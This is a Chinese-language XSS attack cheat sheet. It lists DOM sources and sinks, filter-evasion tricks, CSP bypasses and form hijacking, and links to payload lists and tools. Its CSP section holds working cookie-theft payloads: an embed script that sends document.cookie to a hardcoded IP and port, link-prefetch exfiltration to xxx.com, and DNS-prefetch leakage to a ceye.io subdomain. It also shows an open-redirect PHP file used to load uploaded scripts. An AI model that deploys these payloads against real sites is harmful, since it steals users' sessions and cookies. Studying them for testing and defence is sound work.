# xss



## DOM XSS 检测

观察输入点和输出点：

客户端产生xss

测试技巧:关注输入和输出

**输入:**

document.URL

document.URLUnencoded

document.location

document.referrer

document.xxxx

window.location

window.name

window.xxxxxx

**输出:**

document.write()

document.writeln()

document.body.innerHtml=...

document.forms[0].action=...

document.attachEvent(...)

document.create...(...)

document.execCommand(...)

document.body. ...

window.attachEvent(...)

document.location=...

document.location.hostname=...

document.location.replace(...)

document.location.assign(...)

document.URL=...

window.navigate(...)

document.open(...)

window.open(...)

window.location.href=...

eval(...)

window.execScript(...)

window.setInterval(...)

window.setTimeout(...)

## 绕过

### 过滤特定标签

1. 利用过滤的不完善来绕过
2. 利用事件属性绕过，如：`onload,onerror`等等



### 过滤事件

利用事件过滤的不完全绕过

见eventslist.txt

在[mozilla](https://developer.mozilla.org/en-US/docs/Web/Events)中查找



### 敏感字符的绕过

#### 字符串拼接

`alert=window['alert']`

#### 通过编码绕过

HTML中允许的编码：十进制`&#97`，十六进制`&#x61`

CSS编码：HTML编码和十六进制`\61`

js字符串允许编码：八进制`\141`，十六进制`\x61`，Unicode编码`\u61`

jsfucker

#### 过滤"."

用with代替.

如:`document.alert`=>`with(document)alert`

#### 过滤()

绑定回调函数，如事件函数



#### 过滤空格

标签属性间可以利用0x09,0x10,0x12,0x13,0x0a绕过

标签名称和第一个属性可以利用`/`来代替空格

如`<svg onerror="alert(1)">`=>`<svg/onerror="alert(1)">`

#### 利用svg标签绕过

svg内部标签和语句遵循的规则都是直接继承自xml而不是html，这样svg内部的script标签可以允许存在一部分进制或编码后的字符

如

```html
<svg><script>alert&#x28;&#x31;&#x29;</script></svg>
```



### 字符集编码绕过



#### IE自动识别编码

#### iframe跨域字符集继承

#### UTF-7和US-ASCII绕过

### 特殊字符绕过

[网站](http://l0.cm/encodings/)



## html5新增标签

[HTML5 Security Cheatsheet](http://html5.sec.org)

[HTML5 Security Cheatsheet](https://github.com/cure53/H5SC/)



## httponly绕过

### CVE-2012-0053



### Flash/Java



## csp



Content Security Policy （CSP）内容安全策略，是一个附加的安全层，有助于检测并缓解某些类型的攻击，包括跨站脚本（XSS）和数据注入攻击。

CSP的特点就是他是在浏览器层面做的防护，是和同源策略同一级别，除非浏览器本身出现漏洞，否则不可能从机制上绕过。

CSP只允许被认可的JS块、JS文件、CSS等解析，只允许向指定的域发起请求。

### 语法

https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP

https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy

[`default-src`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/default-src) :在其他资源类型没有符合自己的策略时应用该策略(有关完整列表查看[`default-src`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/default-src) )

![img](https://images.seebug.org/content/images/2017/10/7b7e1d4c-9d9a-4bd0-ae6d-f266871fa300.png-w331s)

![img](https://images.seebug.org/content/images/2017/10/c5a45eca-7e0c-4ebf-8143-712e4594f2fd.png-w331s)





### 绕过

https://evoa.me/index.php/archives/53/

https://hurricane618.me/2018/06/30/csp-bypass-summary/

https://cloud.tencent.com/developer/article/1073911

https://paper.seebug.org/423/



#### CRLF绕过csp

向响应中的csp之前插入换行，导致csp失效





#### 利用重定向绕过csp策略为self

如果csp策略为：`default-src 'self';script-src http://example/a/;`

那么如果在`http://example/a/`下找到一个重定向点，就可以绕过csp





#### Content-Security-Policy: default-src 'self'; script-src 'self'

找到文件上传点,然后加载js

或者利用jsonp来执行js代码

重定向

#### " Content-Security-Policy: default-src 'self '; script-src http://127.0.0.1/static/ "

重定向

如果可信域内存在一个可控的重定向文件，那么CSP的目录限制就可以被绕过。

假设static目录下存在一个302文件

```
Static/302.php

<?php Header("location: ".$_GET['url'])?>
```

像刚才一样，上传一个test.jpg 然后通过302.php跳转到upload目录加载js就可以成功执行

```
<script src="static/302.php?url=upload/test.jpg">
```









#### 利用标签来外带数据

##### embed

```javascript
<body><script>
var iframe = eval("document.create\105lement('embed')");
iframe.src="http://39.108.164.219:60005/?"+document.cookie;
eval("document.body.append\103hild(iframe)");</script></body>
```



#####  **Link Prefetch**

在 HTML5 中有一个新特性，[Link Prefetch](https://developer.mozilla.org/en-US/docs/Web/HTTP/Link_prefetching_FAQ)(页面资源预加载)，浏览器会根据指示在空闲时预加载指定的页面，并把它们存储在缓存里，这样用户访问这些页面时，浏览器就能直接从缓存中提取出来，从而加快访问速度

下面就说下几种可以实现预加载的方式

**prefetch**

一般是通过 link 标签来实现预加载的指

`<link rel="prefetch" href="http://xxx.com">`



但是在标签内的话是没办法打到 Cookie 的，但如果我们可以执行内联 JS，情况就不一样了

Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline';



如果 CSP 头是这样的，我们可以通过利用 JS 创建 link 标签的方式打到 Cookie

```javascript


<script>

var i=document.createElement('link');

i.setAttribute('rel','prefetch');

i.setAttribute('href','http://xxx.com?'+document.cookie);

document.head.appendChild(i);

</script>
```







**dns-prefetch**

dns-prefetch(DNS预解析) 允许浏览器在后台提前将资源的域名转换为 IP 地址，当用户访问该资源时就可以加快 DNS 解析。

`<link rel="dns-prefetch" href="http://xxx.com">`

同样想要在

Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline';



这种情况下收获 Cookie 的话

```javascript


<script>

	 dcl = document.cookie.split(";");

	 n0 = document.getElementsByTagName("HEAD")[0];



	 for (var i=0; i<dcl.length;i++)

	 {

	       console.log(dcl[i]);

	      n0.innerHTML = n0.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + escape(dcl[i].replace(/\//g, "-")).replace(/%/g, "_") + '.' + location.hostname.replace(/\./g, "-") +  ".wb7g7z.ceye.io\">";

	}

</script>
```



因为域名的命名规则是 [\.-a-zA-Z0-9]+，所以需要对一些特殊字符进行替换

然后到 ns 服务器上获取 DNS 查询记录就可以了，我用的是这个[平台](http://ceye.io)

**preconnect**

preconnect(预连接)，与 DNS预解析 类似，但它不仅完成 DNS 预解析，还进行 TCP 握手和 TLS 协商

利用方式和上面类似

**preload**

preload 是一个新的 web 标准，提供了取回当前页面的特定资源更多的控制。它聚焦于取回当前页面并且提供了高优先权，而 prefetch 以低优先权取回下一个页面的资源

和其他属性值不同的是，它是由 connect-src 决定的，只有 CSP 长下面这样时才会对 href 里的资源发起请求

Content-Security-Policy: default-src 'self'; connect-src *;

然后就是和上面类似的 payload 了

`<link rel="preload" href=http://xxx.com>`

**prerender**

测试了下好像已经不行了，没有 CSP 头也不行

#### csp策略不够严格导致的绕过

```html
<script></script>
<frame></frame>
<object></object>

```



### csp常用网站

 https://csp-evaluator.withgoogle.com/  可以查看csp策略的安全等级



## 劫持form

如何劫持呢？利用两个 HTML5 的有趣属性：

> https://www.w3school.com.cn/tags/att_input_formaction.asp
>
> https://www.w3school.com.cn/tags/att_input_form.asp

 我们可以利用留言功能插入一个在表单之外的 input 标签，再利用这两个属性来劫持表单



## 常用工具

### Payload

[Burp Payload List](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

https://github.com/Ph0rse/Awesome-XSS

[OWASP XSS List](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)

[ha.ckers.org](http://ha.ckers.org/xss.html)

[Xss Vector](https://gist.github.com/kurobeats/9a613c9ab68914312cbb415134795b45)



### 工具

xss平台：[beef](https://github.com/beefproject/beef)

动态执行JS：[JShell](https://github.com/s0md3v/JShell)

xss扫描器：[XSStrike](https://github.com/s0md3v/XSStrike)

xss扫描器：[knoxss](https://knoxss.me/?page_id=7)

